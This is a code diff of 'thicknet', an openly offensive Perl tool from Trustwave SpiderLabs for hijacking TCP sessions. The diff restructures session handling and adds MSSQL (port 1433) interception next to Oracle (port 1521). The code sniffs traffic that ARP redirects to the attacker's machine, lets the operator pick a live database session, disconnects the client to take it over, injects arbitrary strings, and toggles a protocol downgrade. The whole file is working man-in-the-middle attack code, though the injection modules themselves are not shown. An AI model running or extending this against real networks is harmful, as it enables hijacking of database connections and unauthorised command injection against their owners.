@@ -2,8 +2,8 @@
 
 =header
     thicknet - A tool to manipulate and take control of TCP sessions
-	Created by Steve Ocepek and Wendel G. Henrique
-	Copyright (C) 2010 Trustwave Holdings, Inc.
+	Created by Wendel G. Henrique and Steve Ocepek
+	Copyright (C) 2010, 2011 Trustwave Holdings, Inc.
  
     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
@@ -23,13 +23,17 @@ use strict;
 use warnings;
 use Net::Pcap;
 use lib '.';
-use thicknet::Util;
-use thicknet::pcap::Oracle;
-use thicknet::pcap::ARP;
-use thicknet::pcap::Default;
 use AnyEvent;
 use Data::HexDump;
 use EV;
+
+use thicknet::Util;
+use thicknet::packet::MSSQL;
+use thicknet::packet::Oracle;
+use thicknet::packet::Default;
+use thicknet::pcap::ARP;
+use thicknet::pcap::Pcap;
+
 
 # Flush after every write to stdout
 local $| = 1;
@@ -41,7 +45,7 @@ my $dev;
 
 # Session hash
 # key: client:clientport:server:serverport
-my %sessions;
+my $sessions = {};
 
 # Console vars
 my @console;
@@ -61,7 +65,7 @@ sub cmdline {
 	else {
 		# Show available devices, allow user to choose
 		# TODO allow int specified on ARGV
-		my @devs = Net::Pcap::findalldevs(\$err, \%devinfo);
+		my @devs = Net::Pcap::findalldevs(\%devinfo, \$err);
 		if ($devs[0]) {
 			print "\n";
 			print "Please choose an interface to listen on\n\n";
@@ -85,6 +89,7 @@ sub cmdline {
 	}
 }
 
+
 sub console_inject {
 	chomp (my ($input) = @_);
 	push (@console, \&console_inject);
@@ -99,36 +104,13 @@ sub console_inject {
 	elsif ($input eq '') {
 	}
 	elsif ($input eq '!!') {
-		$sessions{$context}->{examine} = 0;
+		$sessions->{$context}->{examine} = 0;
 		pop(@console);
 		return;
 	}
 	else {
-		thicknet::pcap::Oracle::inject($sessions{$context}, $input);
-	}
-	return $prompt;
-}
-
-sub console_inject_file {
-	chomp (my ($input) = @_);
-	push (@console, \&console_inject);
-	$prompt = "\nthicknet(inject-" . thicknet::Util::session_hex2ip($context) . ") > "; 
-	if ($input eq '?') {
-		print "Commands:\n\n";
-		print "(string)     inject string into session\n";
-		print "!!           stop injection\n";
-		print "?            help (this page)\n";
-		print "\n";
-	}
-	elsif ($input eq '') {
-	}
-	elsif ($input eq '!!') {
-		$sessions{$context}->{examine} = 0;
-		pop(@console);
-		return;
-	}
-	else {
-		thicknet::pcap::Oracle::inject($sessions{$context}, $input);
+	    my $res = $sessions->{$context}->inject($input);
+		print $res;
 	}
 	return $prompt;
 }
@@ -143,32 +125,49 @@ sub console_examine {
 		print "s            toggle packet display\n";
 		print "i            hijack connection and begin injection\n";
 		print "             (caution: will disconnect client!)\n";
+		print "d            enable/disable protocol downgrade\n";
 		print "back         go back to higher level menu\n";
 		print "?            help (this page)\n";
 		print "\n";
 	}
 	elsif ($input eq 's') {
-		if ($sessions{$context}->{examine}) {
-			$sessions{$context}->{examine} = 0;
+		if ($sessions->{$context}->{examine}) {
+			$sessions->{$context}->{examine} = 0;
 			print "Packet display disabled\n";
 		}
 		else {
-			$sessions{$context}->{examine} = 1;
+			$sessions->{$context}->{examine} = 1;
 			print "Packet display enabled\n";
 		}
 	}
 	elsif ($input eq 'i') {
-		if ($sessions{$context}->{sled}) {
-			# Block and start dumping packets
-			$sessions{$context}->{block} = 1;
-			$sessions{$context}->{examine} = 1;
+		if ($sessions->{$context}->{sled}) {
+			$sessions->{$context}->{examine} = 1;
 			console_inject('');
 		} else {
-			print "Can't inject: sled not captured";
+			print "Can't inject: sled not captured\n";
 		}
 	}
+	elsif ($input eq 'd') {
+	    if ($sessions->{$context}->downgrade()) {
+    		my $err = $sessions->{$context}->downgrade(0);
+    		if ($err) {
+    		    print $err . "\n";
+		    } else {
+		        print "\nProtocol downgrade disabled\n";
+		    }
+    	} 
+    	else {
+    		my $err = $sessions->{$context}->downgrade(1);
+    		if ($err) {
+    		    print $err . "\n";
+		    } else {
+		        print "\nProtocol downgrade disabled\n";
+		    }
+	    }
+	}
 	elsif ($input eq 'back') {
-		$sessions{$context}->{examine} = 0;
+		$sessions->{$context}->{examine} = 0;
 		pop(@console);
 		return;
 	}
@@ -189,7 +188,6 @@ sub console_root {
 	if ($input eq '?') {
 		print "Commands:\n\n";
 		print "ls           list sessions\n";
-		print "d            enable/disable protocol downgrade\n";
 		print "x (session)  examine session (and possibly inject)\n";
 		print "q            quit\n";
 		print "?            help (this page)\n";
@@ -197,9 +195,9 @@ sub console_root {
 	} 
 	elsif ($input eq 'ls') {
 		print "\n";
-		foreach my $session (keys(%sessions)) {
+		foreach my $session (keys(%{$sessions})) {
 			my $string = thicknet::Util::session_hex2ip($session);
-			if ($sessions{$session}->{sled}) {
+			if ($sessions->{$session}->{sled}) {
 				$string = $string . " !I";
 			}
 			print "$string\n";
@@ -210,18 +208,9 @@ sub console_root {
 	elsif (($input eq 'q') or ($input eq 'exit')) {
 		exit;
 	}
-	elsif ($input eq 'd') {
-		if ($thicknet::pcap::Oracle::downgrade) {
-			$thicknet::pcap::Oracle::downgrade = 0;
-			print "\nProtocol downgrade disabled\n";
-		} else {
-			$thicknet::pcap::Oracle::downgrade = 1;
-			print "\nProtocol downgrade enabled\n";
-		}
-	}
 	elsif ($input =~ /x (\b(?:\d{1,3}\.){3}\d{1,3}\b:\d{1,5}:\b(?:\d{1,3}\.){3}\d{1,3}\b:\d{1,5})/) {
 		my $input_session = thicknet::Util::session_ip2hex($1);
-		if ($sessions{$input_session}) {
+		if ($sessions->{$input_session}) {
 			$context = $input_session;
 			console_examine('');
 		}
@@ -263,27 +252,100 @@ my $watcher_cli = AnyEvent->io (fh => \*STDIN, poll => 'r', cb => sub {
 	console($input);
 });
 
-my $watcher_oracle = thicknet::pcap::Oracle::init (
-	myip => $myip,
-	mymac => $mymac,
-	dev => $dev,
-	sessions => \%sessions
-	);
+#New stuff
 
+### Default setup ###
+### This is the catch-all for packets not handled by the other modules
+
+my $default_pcaph;
+sub default_packet {
+    my ($user_data, $header, $pkt) = @_;
+    my $p = thicknet::packet::Default->new($pkt);
+    $p->sref($sessions);
+    $p->mymac($mymac);
+    $p->pcaph($default_pcaph);
+    $p->preprocess();
+    $p->process();
+    $p->postprocess();
+}
+
+my $default_pcap = thicknet::pcap::Pcap->new();
+$default_pcap->ip($myip);
+$default_pcap->mac($mymac);
+$default_pcap->dev($dev);
+
+# Notice that this must be changed when you add a module
+# It looks at all traffic except for the packets covered by the other modules
+$default_pcap->filter("((tcp and not port 1521 and not port 1433) or udp or icmp) and ether dst $mymac and ip dst not $myip");
+
+# Get back a pcap handler
+$default_pcaph = $default_pcap->init();
+my $default_timer = AnyEvent->timer (after => 0, interval => .001, cb => sub {
+	Net::Pcap::pcap_dispatch($default_pcaph, 1, \&default_packet, "user data");
+});
+### End Default ###
+
+### Oracle setup ###
+my $oracle_pcaph;
+sub oracle_packet {
+    my ($user_data, $header, $pkt) = @_;
+    my $p = thicknet::packet::Oracle->new($pkt);
+    $p->sref($sessions);
+    $p->mymac($mymac);
+    $p->pcaph($oracle_pcaph);
+    $p->preprocess();
+    $p->process();
+    $p->postprocess();
+}
+
+my $oracle_pcap = thicknet::pcap::Pcap->new();
+$oracle_pcap->ip($myip);
+$oracle_pcap->mac($mymac);
+$oracle_pcap->dev($dev);
+$oracle_pcap->filter("tcp and port 1521 and ether dst $mymac and ip dst not $myip");
+# Get back a pcap handler
+$oracle_pcaph = $oracle_pcap->init();
+my $oracle_timer = AnyEvent->timer (after => 0, interval => .001, cb => sub {
+	Net::Pcap::pcap_dispatch($oracle_pcaph, 1, \&oracle_packet, "user data");
+});
+### End Oracle ###
+
+### MSSQL setup ###
+my $mssql_pcaph;
+sub mssql_packet {
+    my ($user_data, $header, $pkt) = @_;
+    my $p = thicknet::packet::MSSQL->new($pkt);
+    $p->sref($sessions);
+    $p->mymac($mymac);
+    $p->pcaph($mssql_pcaph);
+    $p->preprocess();
+    $p->process();
+    $p->postprocess();
+}
+
+my $mssql_pcap = thicknet::pcap::Pcap->new();
+$mssql_pcap->ip($myip);
+$mssql_pcap->mac($mymac);
+$mssql_pcap->dev($dev);
+$mssql_pcap->filter("tcp and port 1433 and ether dst $mymac and ip dst not $myip");
+# Get back a pcap handler
+$mssql_pcaph = $mssql_pcap->init();
+my $mssql_timer = AnyEvent->timer (after => 0, interval => .001, cb => sub {
+	Net::Pcap::pcap_dispatch($mssql_pcaph, 1, \&mssql_packet, "user data");
+});
+### End MSSQL ###
+
+
+### ARP cache handler ###
 my $watcher_arp = thicknet::pcap::ARP::init (
 	dev => $dev,
 	myip => $myip,
 	mymac => $mymac
 	);
 
-my $watcher_default = thicknet::pcap::Default::init (
-	dev => $dev,
-	myip => $myip,
-	mymac => $mymac
-	);
-
-print "\nthicknet (barcelona)\n";
-print "(c) 2010 Wendel G. Henrique and Steve Ocepek\n";
-print "Trustwave SpiderLabs\n";
+print "\nthicknet\n";
+print "(c) 2010, 2011 Trustwave Holdings, Inc.\n";
+print "Created by Wendel G. Henrique and Steve Ocepek\n";
+print "Trustwave SpiderLabs(R)\n";
 print $prompt;
 EV::loop;
